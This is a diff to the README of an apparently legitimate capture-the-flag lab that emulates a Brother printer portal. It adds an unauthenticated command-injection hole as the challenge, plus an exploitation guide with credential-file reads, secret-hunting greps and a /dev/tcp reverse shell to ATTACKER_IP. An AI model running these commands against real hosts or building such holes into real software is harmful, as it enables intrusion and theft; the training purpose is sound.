@@ -4,11 +4,11 @@ A CTF machine that emulates a Brother printer web portal with intentional securi
 
 ## 🎯 CTF Objective
 
-This machine simulates a Brother printer web interface with default credentials and exposed sensitive information. Participants need to:
+This machine simulates a Brother printer web interface with a critical Remote Code Execution (RCE) vulnerability. Participants need to:
 
 1. **Access the settings page** (anonymous access enabled by default)
-2. **Find SMTP credentials** displayed on the settings page
-3. **Extract the flag** from the SMTP password field
+2. **Exploit the System Diagnostics tool** to execute arbitrary commands
+3. **Use RCE to discover the flag** hidden in the system
 4. **Optional:** Login with default credentials (1234567:1234567) to access admin functions
 
 ## 🔑 Default Credentials
@@ -18,9 +18,10 @@ This machine simulates a Brother printer web interface with default credentials 
 
 ## 🏴 Flag Information
 
-The flag is hidden in the SMTP credentials:
-- **SMTP Username:** `scans@chernobyl.local`
-- **SMTP Password:** `YouFoundMyPass` ← **This is the flag!**
+The flag is hidden in the system and can be discovered through RCE exploitation:
+- **Flag Location:** Hidden in system files or environment variables
+- **Discovery Method:** Use the System Diagnostics tool to execute commands
+- **Hint:** Try commands like `env`, `cat /etc/passwd`, or `find / -name "*flag*"`
 
 ## 🚀 Quick Start
 
@@ -50,7 +51,8 @@ The flag is hidden in the SMTP credentials:
 
 5. **Access the portal:**
    - Open your browser to `http://localhost:5000`
-   - Navigate to Settings to find the flag (no login required by default)
+   - Navigate to Settings and use the System Diagnostics tool
+   - Execute commands to discover the hidden flag (no login required by default)
    - Optional: Login with credentials: `1234567` / `1234567` for admin access
 
 ### Production Deployment with Ansible
@@ -69,7 +71,8 @@ The flag is hidden in the SMTP credentials:
 
 4. **Access the deployed portal:**
    - Navigate to `http://<ctf-box-ip>`
-   - Find the flag in Settings (no login required by default)
+   - Use the System Diagnostics tool in Settings to exploit RCE
+   - Execute commands to discover the hidden flag (no login required by default)
    - Optional: Login for admin access to change settings
 
 ## 🏗️ Architecture
@@ -106,7 +109,8 @@ brother-printer-ctf/
 - **Anonymous Access:** View settings without login (configurable)
 - **Login System:** Default credentials authentication with password change capability
 - **Dashboard:** Overview of printer status and quick actions
-- **Settings Page:** SMTP credentials display (contains the flag)
+- **Settings Page:** System diagnostics tool with RCE vulnerability
+- **RCE Vulnerability:** Remote code execution through system diagnostics
 - **Admin Panel:** Security warnings and audit logs
 - **Access Control:** Admin can enable/disable anonymous access
 - **Password Management:** Change admin password functionality
@@ -123,13 +127,14 @@ brother-printer-ctf/
 
 This CTF machine includes several intentional security issues:
 
-1. **Anonymous Access:** Settings accessible without authentication by default
-2. **Default Credentials:** Unchanged default login credentials
-3. **Exposed SMTP Credentials:** Plain text storage and display
-4. **Security Warnings:** Admin panel shows various security issues
-5. **HTTP Only:** No HTTPS encryption (realistic for many printer interfaces)
-6. **Verbose Error Messages:** Detailed error information in logs
-7. **Privilege Escalation:** Admin functions accessible with default credentials
+1. **Remote Code Execution (RCE):** System diagnostics tool allows arbitrary command execution
+2. **Anonymous Access:** RCE vulnerability accessible without authentication by default
+3. **Default Credentials:** Unchanged default login credentials
+4. **No Input Validation:** Commands executed without sanitization or validation
+5. **Security Warnings:** Admin panel shows various security issues
+6. **HTTP Only:** No HTTPS encryption (realistic for many printer interfaces)
+7. **Verbose Error Messages:** Detailed error information in logs
+8. **Privilege Escalation:** Admin functions accessible with default credentials
 
 ## 🛠️ Deployment Options
 
@@ -154,12 +159,15 @@ This CTF machine includes several intentional security issues:
 ## 📝 Customization
 
 ### Changing the Flag
-Edit the `SMTP_CREDENTIALS` in `app.py`:
-```python
-SMTP_CREDENTIALS = {
-    "username": "scans@chernobyl.local",
-    "password": "YourNewFlagHere"
-}
+The flag is now hidden in the system. You can modify how it's discovered by:
+
+1. **Environment Variable:** Set a custom environment variable
+2. **File-based Flag:** Create a flag file in the system
+3. **Custom Command Output:** Modify the RCE to return a custom flag
+
+Example environment variable approach:
+```bash
+export CTF_FLAG="YourNewFlagHere"
 ```
 
 ### Modifying Default Credentials
@@ -188,19 +196,72 @@ The Ansible playbook automatically installs:
 - Create corresponding templates
 - Implement intentional security flaws
 
+## 🚨 RCE Exploitation Guide
+
+### Finding the Vulnerability
+1. **Navigate to Settings:** Access the settings page (no login required)
+2. **Locate System Diagnostics:** Find the "System Diagnostics" section
+3. **Identify RCE:** Notice the command execution functionality
+
+### Exploitation Techniques
+1. **Basic Commands:**
+   ```bash
+   whoami          # Check current user
+   id              # Check user ID and groups
+   pwd             # Check current directory
+   ls -la          # List files and directories
+   ```
+
+2. **System Information:**
+   ```bash
+   uname -a        # System information
+   cat /etc/os-release  # OS version
+   ps aux          # Running processes
+   netstat -tulpn  # Network connections
+   ```
+
+3. **Flag Discovery:**
+   ```bash
+   env             # Environment variables
+   find / -name "*flag*" 2>/dev/null  # Search for flag files
+   cat /etc/passwd # User accounts
+   cat /proc/version  # Kernel version
+   ```
+
+4. **Advanced Techniques:**
+   ```bash
+   # Reverse shell (if network allows)
+   bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+   
+   # File system exploration
+   find / -type f -name "*.txt" 2>/dev/null | head -20
+   
+   # Process enumeration
+   ps aux | grep -E "(flag|secret|password)"
+   ```
+
 ## 🎓 Educational Value
 
 This CTF machine teaches:
+- **Remote Code Execution (RCE):** Critical vulnerability allowing arbitrary command execution
 - **Web Application Security:** Common vulnerabilities in embedded devices
-- **Anonymous Access Risks:** Dangers of allowing unauthenticated access
+- **Anonymous Access Risks:** Dangers of allowing unauthenticated access to sensitive functions
+- **Input Validation:** Importance of sanitizing and validating user input
 - **Default Credentials:** Importance of changing default passwords
-- **Information Disclosure:** Dangers of exposing sensitive data
 - **Access Control:** Proper authentication and authorization mechanisms
 - **Network Security:** Risks of unencrypted web interfaces
 - **Printer Security:** Specific vulnerabilities in network printers
 - **Privilege Escalation:** How default credentials can lead to admin access
+- **System Exploitation:** Using RCE to discover hidden information
 
 ## 🆕 Recent Updates
+
+### Version 2.1 Features
+- **RCE Vulnerability:** Critical Remote Code Execution through System Diagnostics tool
+- **Hidden Flag:** Flag is no longer visible in SMTP credentials, must be discovered via RCE
+- **Anonymous RCE Access:** RCE vulnerability accessible without authentication
+- **System Diagnostics:** Professional-looking diagnostic tool that executes arbitrary commands
+- **Enhanced CTF Challenge:** More realistic and challenging exploitation scenario
 
 ### Version 2.0 Features
 - **Anonymous Access System:** Users can view settings without login by default
@@ -211,8 +272,9 @@ This CTF machine teaches:
 - **Improved UI:** Better user experience with conditional content display
 
 ### Migration Notes
-- **Default Behavior:** Anonymous access is now enabled by default
-- **CTF Impact:** Flag is now accessible without login (more realistic vulnerability)
+- **Critical Change:** Flag is now hidden and requires RCE exploitation to discover
+- **Default Behavior:** Anonymous access is enabled by default, including RCE vulnerability
+- **CTF Impact:** More challenging - participants must exploit RCE to find the flag
 - **Admin Functions:** Password changes and access control require authentication
 - **CUPS Support:** Full printing system available after deployment
 
